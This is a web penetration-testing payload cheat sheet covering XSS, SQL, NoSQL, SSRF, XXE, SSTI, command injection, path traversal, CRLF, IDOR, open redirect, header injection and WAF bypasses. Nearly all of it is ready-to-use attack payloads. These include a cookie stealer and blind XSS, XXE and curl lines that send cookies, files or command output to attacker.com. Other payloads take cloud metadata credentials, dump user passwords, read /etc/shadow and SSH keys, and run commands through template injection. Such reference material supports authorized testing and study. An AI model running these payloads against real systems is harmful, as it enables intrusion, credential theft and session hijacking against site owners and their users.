# Payload Cheatsheets
> Sources: WSTG v4.2, Real-World Bug Hunting (Yaworski), Bug Bounty Bootcamp (Li), The Tangled Web (Zalewski)

## Quick Access
- [XSS Payloads](#xss-payloads)
- [SQL Injection Payloads](#sql-injection-payloads)
- [SSRF Payloads](#ssrf-payloads)
- [XXE Payloads](#xxe-payloads)
- [SSTI Payloads](#ssti-payloads)
- [Command Injection Payloads](#command-injection-payloads)
- [Path Traversal Payloads](#path-traversal-payloads)
- [CRLF Injection Payloads](#crlf-injection-payloads)
- [IDOR Testing Patterns](#idor-testing-patterns)
- [Open Redirect Payloads](#open-redirect-payloads)
- [XXS Filter Bypass Payloads](#xss-filter-bypass-payloads)
- [Header Injection Payloads](#header-injection-payloads)
- [WAF Bypass Techniques](#waf-bypass-techniques)

---

## XSS Payloads

### Basic Detection
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<video><source onerror="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
```

### Attribute Context
```html
" onmouseover="alert(1)
" onmouseover="alert(1)" x="
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
' onmouseover='alert(1)
```

### JavaScript String Context
```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
"-alert(1)-"
\"-alert(1)-\"
```

### Href/Src Context
```
javascript:alert(1)
javascript:alert`1`
data:text/html,<script>alert(1)</script>
```

### No Parentheses (WAF bypass)
```html
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>
<img src=x onerror="throw onerror=alert,1337">
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>
```

### Filter Bypasses
```html
<!-- Case insensitive -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Broken tags (some parsers complete them) -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Null byte (old browsers) -->
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- HTML encoding within attribute -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- URL encoding in href -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">

<!-- Unicode escapes in JS -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Tab/newline in javascript: URL -->
java&#x09;script:alert(1)
java&#x0A;script:alert(1)
java&#x0D;script:alert(1)
JaVaScRiPt:alert(1)

<!-- HTML5 Event handlers -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><a xlink:href="javascript:alert(1)">click</a></math>
<object data="javascript:alert(1)">
```

### Blind XSS Payloads
```html
<script src=//xsshunter.com/yourpayload></script>
<img src=x onerror="fetch('//xss.yourdomain.com/'+btoa(document.cookie))">
<script>document.location='//attacker.com/xss?c='+document.cookie</script>
"><script src=https://yourdomain.com/xss.js></script>
```

### Cookie Stealer
```html
<script>
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);
</script>
```

---

## SQL Injection Payloads

### Detection
```sql
'
''
`
')
"))
\
%27
%22
-- comment
# comment
/* comment */
```

### Auth Bypass
```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
') OR ('1'='1
admin'--
admin'#
' OR 'x'='x
1' OR '1'='1
```

### UNION-Based (MySQL)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

### Blind Boolean-Based
```sql
' AND 1=1--  (true)
' AND 1=2--  (false)
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>64--
' AND (SELECT COUNT(*) FROM users)>0--
```

### Time-Based Blind
```sql
-- MySQL
' AND SLEEP(5)--
'; SELECT SLEEP(5)--
1' AND SLEEP(5)#

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
1; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--

-- Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### Error-Based (MySQL)
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
```

### NoSQL (MongoDB)
```javascript
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}
{"$where": "this.username == this.password"}
```

---

## SSRF Payloads

### Basic SSRF
```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://0/
http://2130706433/   (127.0.0.1 decimal)
http://017700000001/ (127.0.0.1 octal)
http://0x7f000001/   (127.0.0.1 hex)
http://127.1/
```

### Cloud Metadata
```
# AWS
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires: -H "Metadata-Flavor: Google"

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: -H "Metadata: true"

# Digital Ocean
http://169.254.169.254/metadata/v1.json

# AWS ECS Task Metadata
http://169.254.170.2/v2/credentials/
```

### SSRF Bypass Payloads
```
http://localhost.attacker.com/       → resolves to 127.0.0.1
http://127.0.0.1.nip.io/            → resolves to 127.0.0.1
http://2130706433/                   → 127.0.0.1 decimal
http://attacker.com@169.254.169.254/ → @ authority confusion
http://169.254.169.254#attacker.com  → fragment confusion
http://[::ffff:169.254.169.254]/     → IPv4-mapped IPv6
http://ⓛⓞⓒⓐⓛⓗⓞⓤⓢⓣ/             → Unicode
```

### SSRF via Other Protocols
```
gopher://127.0.0.1:6379/_FLUSHALL%0d%0a   → Redis
gopher://127.0.0.1:25/xHELO localhost      → SMTP
file:///etc/passwd                          → Local file read
dict://127.0.0.1:11211/stats               → Memcached
```

---

## XXE Payloads

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>
```

### Blind XXE (OOB)
```xml
<!-- Attacker's server hosts evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;

<!-- XML payload: -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<root><data>test</data></root>
```

### XInclude (When DOCTYPE Not Controllable)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE via SVG Upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text y="16">&xxe;</text>
</svg>
```

---

## SSTI Payloads

### Detection Polyglot
```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### By Engine
```
# Jinja2 (Python) — RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[258](['id'],stdout=-1).communicate()[0]}}
{{lipsum.__globals__.os.popen('id').read()}}

# Twig (PHP) — RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|map('system')|join}}

# Freemarker (Java) — RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Smarty (PHP) — RCE
{php}echo system('id');{/php}

# Velocity (Java) — RCE
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

# ERB (Ruby) — RCE
<%= system('id') %>
<%= `id` %>

# Pebble (Java)
{% for i in "".__class__.__mro__[1].__subclasses__() %}{% if "Runtime" in i.__name__ %}{{i().exec("id")}}{% endif %}{% endfor %}
```

---

## Command Injection Payloads

### Basic Separators
```bash
;id
|id
||id
&&id
&id
`id`
$(id)
%0aid      (URL-encoded newline)
%0d%0aid   (URL-encoded CRLF)
```

### Time-Based Blind
```bash
;sleep 10
|sleep 10
&&sleep 10
$(sleep 10)
`sleep 10`
;ping -c 10 127.0.0.1
;curl attacker.com/$(id|base64)
```

### Filter Bypass
```bash
# Space bypass
{id}
${IFS}id
id<>/dev/null
id${IFS}
cat${IFS}/etc/passwd

# String concatenation
i"d"
i'd'
/bin/cat /etc/"pass"wd

# Variable substitution
$((${#path}+0))  # zero
id = ${HOME:0:0}id

# Brace expansion
{cat,/etc/passwd}

# Wildcard
/bin/ca? /etc/pass*
/bin/c[a]t /etc/p?sswd

# Hex encoding
echo "$(printf '\x69\x64')"  # 'id'
```

---

## Path Traversal Payloads

### Basic Sequences
```
../
..\
....//
....\\
```

### Encoded Variants
```
%2e%2e%2f           → ../
%2e%2e/             → ../
..%2f               → ../
%2e%2e%5c           → ..\
%252e%252e%252f     → ../ (double URL encoding)
%c0%ae%c0%ae/       → ../ (overlong UTF-8)
%c0%ae./            → ./  
..%c0%af            → ../
..%ef%bc%8f         → ../
```

### File Targets
```
# Linux
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../home/$USER/.ssh/id_rsa
../../../../root/.ssh/id_rsa

# Windows
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\boot.ini
```

---

## CRLF Injection Payloads

```
%0d%0a           → CRLF
%0a              → LF only (may work)
%0d              → CR only (rare)
\r\n
%E5%98%8A%E5%98%8D  → Unicode CRLF

# Header injection
/path?param=val%0d%0aSet-Cookie:%20session=evil
/path?param=val%0d%0aX-Injected-Header:%20pwned

# XSS via CRLF
/path?param=val%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

---

## IDOR Testing Patterns

### Parameter Manipulation
```
# Numeric IDs
user_id=1 → user_id=2, user_id=0, user_id=-1
id=100 → id=101, id=1, id=99999
order_id=ABC123 → order_id=ABC124

# UUIDs (retrieve from another account's response)
/api/users/550e8400-e29b-41d4-a716-446655440000
→ /api/users/550e8400-e29b-41d4-a716-446655440001

# Hash-based (md5/sha1 of sequential IDs)
md5("1") = c4ca4238a0b923820dcc509a6f75849b
md5("2") = c81e728d9d4c2f636f067f89cc14862c

# Base64-encoded
eyJ1c2VySWQiOiAxMjN9 → decode → {"userId": 123} → modify → encode

# GUID-based: try to find/guess another user's GUID via recon
```

### Method/Content-Type Variation
```
# If POST /api/users/123 is protected, try:
GET /api/users/123
PUT /api/users/123
DELETE /api/users/123
OPTIONS /api/users/123
PATCH /api/users/123

# If JSON is protected, try form-urlencoded:
Content-Type: application/x-www-form-urlencoded
id=123&action=view

# Add IDOR params to requests that don't normally have them:
GET /api/profile → GET /api/profile?user_id=456
POST /api/update → POST /api/update {"user_id": 456, "email": "x"}
```

---

## Open Redirect Payloads

```
https://attacker.com
//attacker.com
\/\/attacker.com
/\/attacker.com
///attacker.com
\\\attacker.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# @ Authority confusion
https://target.com@attacker.com
https://attacker.com?target.com
https://attacker.com#target.com

# Subdomain confusion
https://target.com.attacker.com
https://attacker.target.com   (if subdomain takeover possible)

# URL encoding
https://attacker%2ecom
https://attacker%252ecom   (double encoding)
https%3A%2F%2Fattacker.com

# Autocorrect bypass (browser may fix)
https:attacker.com
https:\attacker.com

# IP-based
https://0xd83acd4e/   (hex IP of attacker)
```

---

## XSS Filter Bypass Payloads

### Encoding Bypasses
```html
<!-- HTML entities in event handlers -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Decimal vs hex entities -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">

<!-- Unicode normalization -->
＜script＞alert(1)＜/script＞   (fullwidth chars → normalized to < >)

<!-- CSS expressions (IE legacy) -->
<style>body{color:expression(alert(1))}</style>
```

### Tag/Keyword Bypass
```html
<!-- When 'script' is filtered: -->
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form action=javascript:alert(1)><input type=submit>
<button onclick=alert(1)>click</button>
<isindex action=javascript:alert(1) type=image>
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>CLICK

<!-- When 'alert' is filtered: -->
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror=console.log(1)>
<img src=x onerror=(function(){})()>
<img src=x onerror=eval(atob("YWxlcnQoMSk="))>  → alert(1) base64
<img src=x onerror=window['al'+'ert'](1)>
```

---

## Header Injection Payloads

### Host Header Attacks
```
# Password reset poisoning
Host: attacker.com
Host: target.com.attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com

# Cache poisoning via Host
Host: target.com"><script>alert(1)</script>

# SSRF via Host (internal routing)
Host: internal-service.local
```

### Custom Headers That Apps Trust
```
X-Forwarded-For: 127.0.0.1         → bypass IP blocklist
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

X-Original-URL: /admin             → URL override in some frameworks
X-Rewrite-URL: /admin
X-Forwarded-Path: /admin

X-Custom-IP-Authorization: 127.0.0.1  → auth bypass

# Role/permission override (sometimes works on poorly-designed apps)
X-User-Role: admin
X-Admin: true
X-Is-Admin: 1
```

---

## WAF Bypass Techniques

### SQL Injection WAF Bypass
```sql
-- Whitespace alternatives
' OR/**/1=1--
'%09OR%091=1--  (tab)
'%0aOR%0a1=1--  (newline)
' /*!OR*/ 1=1--  (MySQL versioned comment)
' OR 1/*!50000=*/1--

-- Case variation
' oR '1'='1
' Or 1=1--
' OR 1=1-- (no bypass needed if WAF is case-sensitive)

-- String splitting
' OR 'un'||'ion' = 'union'--
CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74)  (= 'select')

-- HPP (HTTP Parameter Pollution)
?id=1&id=UNION&id=SELECT...

-- Encoding
?id=1%20OR%201%3D1--   (URL encoding)
?id=1%C0%A0OR%C0%A01=1--  (overlong UTF-8 for space)
```

### XSS WAF Bypass
```html
<!-- Comment injection to break patterns -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<img src="x" o<!---->nerror="alert(1)">

<!-- Mutation XSS (mXSS) — browser DOM parsing differs from server parser -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Prototype pollution (in JS frameworks) -->
{"__proto__": {"xss": "<img src=x onerror=alert(1)>"}}

<!-- SVG allowed, script not: -->
<svg><script>alert(1)</script></svg>

<!-- Math/MathML -->
<math><mstyle><mglyph><malignmark></mstyle><mstyle><mi><mglyph><mo>
```
